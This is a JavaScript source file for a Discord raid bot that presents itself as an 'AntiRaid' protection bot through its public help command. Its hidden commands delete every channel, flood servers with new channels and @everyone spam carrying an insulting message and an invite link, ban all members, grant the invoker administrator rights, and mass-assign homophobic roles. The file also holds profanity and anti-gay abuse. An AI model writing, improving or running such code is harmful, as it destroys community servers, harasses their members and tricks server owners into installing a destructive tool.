const { Client, Intents, MessageEmbed } = require('discord.js');
const fs = require('fs');

const settings = JSON.parse(fs.readFileSync('./settings.json', 'utf8'));
const {
  token, prefix, invite, nameserver, channelname, image,
  numberchannelmax, numbermessagemax, noRaidServerID,
  logschannelid, creditname, helpRAIDcommand, statusbot
} = settings;

const BLOCKED_PATH = './blockedServers.json';
let blockedServers = fs.existsSync(BLOCKED_PATH)
  ? JSON.parse(fs.readFileSync(BLOCKED_PATH, 'utf8'))
  : [noRaidServerID];

function saveBlocked() {
  fs.writeFileSync(BLOCKED_PATH, JSON.stringify(blockedServers, null, 2));
}

function isBlocked(guildId) {
  return blockedServers.includes(guildId);
}

const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_BANS,
    Intents.FLAGS.MESSAGE_CONTENT,
    Intents.FLAGS.DIRECT_MESSAGES,
  ]
});

client.once('ready', () => {
  const totalMembers = client.guilds.cache.reduce((a, g) => a + g.memberCount, 0);
  const version = '5.0';

  console.log(`
██████╗  █████╗ ██╗██████╗
██╔══██╗██╔══██╗██║██╔══██╗
██████╔╝███████║██║██║  ██║
██╔══██╗██╔══██║██║██║  ██║
██║  ██║██║  ██║██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝
                ██████╗  ██████╗ ████████╗
                ██╔══██╗██╔═══██╗╚══██╔══╝
█████╗█████╗    ██████╔╝██║   ██║   ██║
╚════╝╚════╝    ██╔══██╗██║   ██║   ██║
                ██████╔╝╚██████╔╝   ██║
                ╚═════╝  ╚═════╝    ╚═╝
                                      v${version}
                      By Walkoud / Rebuilt
  `);

  console.log(`[+] Informations :
        ├── Connected ${client.user.tag}
        ├── id : ${client.user.id}
        ├── Discord Version : ${require('./node_modules/discord.js/package.json').version}
        ├── Servers : ${client.guilds.cache.size}
        ├── Members : ${totalMembers}
_________________________________________________
[+] Configuration :
           ├── Prefix: ${prefix}
           ├── Invite: ${invite}
           ├── Name Server: ${nameserver}
           ├── Channel Name: ${channelname}
           ├── Channel max: ${numberchannelmax}
           ├── Message max: ${numbermessagemax}
           ├── Help Command: ${prefix}${helpRAIDcommand}
           ├── Blocked Servers: ${blockedServers.length}
`);

  const status = statusbot
    .replace('$version$', version)
    .replace('$servers$', client.guilds.cache.size)
    .replace('$members$', totalMembers)
    .replace('$prefix$', prefix);

  client.user.setActivity(status);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (!message.content.startsWith(prefix)) return;

  console.log(`[CMD] User: ${message.author.tag} | Server: ${message.guild.id} | Message: ${message.content}`);

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  const guild = message.guild;

  console.log(`[CMD] Parsed command: "${command}" | Blocked: ${isBlocked(guild.id)}`);

  if (command === helpRAIDcommand || command === 'helper') {
    const embed = new MessageEmbed()
      .setTitle('📋 All Commands')
      .setColor('#ff0000')
      .addFields(
        {
          name: '🔴 Raid Commands',
          value:
            `\`${prefix}StratusRaiding\` — Destroy the server\n` +
            `\`${prefix}del\` — Delete all channels\n` +
            `\`${prefix}red <invite> <name>\` — Destroy with custom invite & channel name\n` +
            `\`${prefix}gay\` — Create gay roles and assign to everyone\n` +
            `\`${prefix}ban\` — Ban all members\n`
        },
        {
          name: '⚙️ Utility Commands',
          value:
            `\`${prefix}r\` — Give yourself admin\n` +
            `\`${prefix}exit\` — Make bot leave server\n` +
            `\`${prefix}invite\` — Get bot invite link\n` +
            `\`${prefix}list\` — List all servers bot is in\n` +
            `\`${prefix}xinvite <id>\` — Get invite from a server by ID\n` +
            `\`${prefix}addblockedserver <id>\` — Block a server from being raided\n` +
            `\`${prefix}removeblockedserver <id>\` — Unblock a server\n`
        }
      )
      .setFooter({ text: `Credit: ${creditname}` });
    return message.channel.send({ embeds: [embed] });
  }

  if (command === 'help') {
    const embed = new MessageEmbed()
      .setTitle('🛡️ AntiRaid Bot Help')
      .setColor('#00ff00')
      .setDescription('A powerful anti-raid protection bot.')
      .addFields({
        name: 'Commands',
        value:
          `\`${prefix}help\` — Show this message\n` +
          `\`${prefix}invite\` — Get invite link\n`
      });
    return message.channel.send({ embeds: [embed] });
  }

  if (command === 'invite') {
    return message.channel.send(`**Bot Invite:** ${invite}`);
  }

  if (command === 'list') {
    const list = client.guilds.cache.map(g => `**${g.name}** — \`${g.id}\``).join('\n');
    const embed = new MessageEmbed()
      .setTitle(`📋 Server List (${client.guilds.cache.size})`)
      .setColor('#0099ff')
      .setDescription(list || 'No servers.');
    return message.channel.send({ embeds: [embed] });
  }

  if (command === 'xinvite') {
    const serverId = args[0];
    if (!serverId) return message.channel.send('❌ Usage: `.xinvite <server ID>`');
    const target = client.guilds.cache.get(serverId);
    if (!target) return message.channel.send('❌ Bot is not in that server.');
    try {
      const ch = target.channels.cache.filter(c => c.type === 'GUILD_TEXT').first();
      if (!ch) return message.channel.send('❌ No text channels found in that server.');
      const inv = await ch.createInvite({ maxAge: 0 });
      return message.channel.send(`**Invite for ${target.name}:** https://discord.gg/${inv.code}`);
    } catch {
      return message.channel.send('❌ Failed to create invite. Missing permissions.');
    }
  }

  if (command === 'addblockedserver') {
    if (message.author.id !== '1482045495512924223') return message.channel.send('❌ You do not have permission to use this command.');
    const id = args[0];
    if (!id) return message.channel.send('❌ Usage: `.addblockedserver <server ID>`');
    if (blockedServers.includes(id)) return message.channel.send('⚠️ That server is already blocked.');
    blockedServers.push(id);
    saveBlocked();
    return message.channel.send(`✅ Server \`${id}\` is now blocked from being raided.`);
  }

  if (command === 'removeblockedserver') {
    if (message.author.id !== '1482045495512924223') return message.channel.send('❌ You do not have permission to use this command.');
    const id = args[0];
    if (!id) return message.channel.send('❌ Usage: `.removeblockedserver <server ID>`');
    const index = blockedServers.indexOf(id);
    if (index === -1) return message.channel.send('⚠️ That server is not in the blocked list.');
    blockedServers.splice(index, 1);
    saveBlocked();
    return message.channel.send(`✅ Server \`${id}\` has been unblocked.`);
  }

  const raidCommands = ['StratusRaiding', 'del', 'red', 'gay', 'ban', 'r', 'exit'];
  if (raidCommands.includes(command) && isBlocked(guild.id)) {
    return message.channel.send('🛡️ This server is protected and cannot be raided.');
  }

  if (command === 'r') {
    try {
      const role = await guild.roles.create({
        name: 'Admin',
        permissions: ['ADMINISTRATOR'],
        color: 'RED'
      });
      await message.member.roles.add(role);
      return message.channel.send(`✅ Admin role given to ${message.author.tag}`);
    } catch {
      return message.channel.send('❌ Failed. Make sure the bot has the highest role.');
    }
  }

  if (command === 'exit') {
    await message.channel.send('👋 Leaving...').catch(() => {});
    return guild.leave();
  }

  if (command === 'del') {
    await message.channel.send('🗑️ Deleting all channels...').catch(() => {});
    await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));
    return;
  }

  if (command === 'StratusRaiding') {
    await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));
    const max = parseInt(numberchannelmax) || 10;
    const msgMax = parseInt(numbermessagemax) || 10;
    const raidMsg = `***Imagine getting raided Fucking DUMBASS :rofl:***\nhttps://discord.gg/Zej5nW2cRG\n\n||@here@everyone ||`;
    const createdChannels = (await Promise.all(
      Array.from({ length: max }, () => guild.channels.create(channelname, { type: 'GUILD_TEXT' }).catch(() => null))
    )).filter(Boolean);
    for (const ch of createdChannels) {
      for (let j = 0; j < msgMax; j++) {
        ch.send(raidMsg).catch(() => {});
      }
    }
    return;
  }

  if (command === 'red') {
    const customInvite = args[0];
    const customChannelName = args.slice(1).join(' ') || channelname;
    if (!customInvite) return message.channel.send('❌ Usage: `.red <invite link> <channel name>`');
    await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));
    const max = parseInt(numberchannelmax) || 10;
    const msgMax = parseInt(numbermessagemax) || 10;
    const createdChannels = (await Promise.all(
      Array.from({ length: max }, () => guild.channels.create(customChannelName, { type: 'GUILD_TEXT' }).catch(() => null))
    )).filter(Boolean);
    for (const ch of createdChannels) {
      for (let j = 0; j < msgMax; j++) {
        ch.send(`@everyone ${customInvite}`).catch(() => {});
      }
    }
    return;
  }

  if (command === 'gay') {
    const max = parseInt(numberchannelmax) || 10;
    const roles = [];
    for (let i = 0; i < max; i++) {
      const role = await guild.roles.create({
        name: 'gay',
        color: '#9B59B6',
        permissions: []
      }).catch(() => null);
      if (role) roles.push(role);
    }
    const members = await guild.members.fetch().catch(() => null);
    if (members) {
      for (const [, member] of members) {
        for (const role of roles) {
          member.roles.add(role).catch(() => {});
        }
      }
    }
    return message.channel.send(`✅ Created ${roles.length} gay roles and assigned to all members.`).catch(() => {});
  }

  if (command === 'ban') {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return message.channel.send('❌ Could not fetch members.');
    let banned = 0;
    for (const [, member] of members) {
      if (member.id === client.user.id || member.id === message.author.id) continue;
      await member.ban({ reason: `Raid by ${creditname}` }).catch(() => {});
      banned++;
    }
    return message.channel.send(`✅ Banned ${banned} members.`).catch(() => {});
  }
});

client.on('error', (err) => {
  console.error('Client error:', err.message);
  console.log('Node NOT Exiting...');
});

process.on('unhandledRejection', (err) => {
  console.error('Unhandled rejection:', err?.message || err);
  console.log('Node NOT Exiting...');
});

client.login(token);
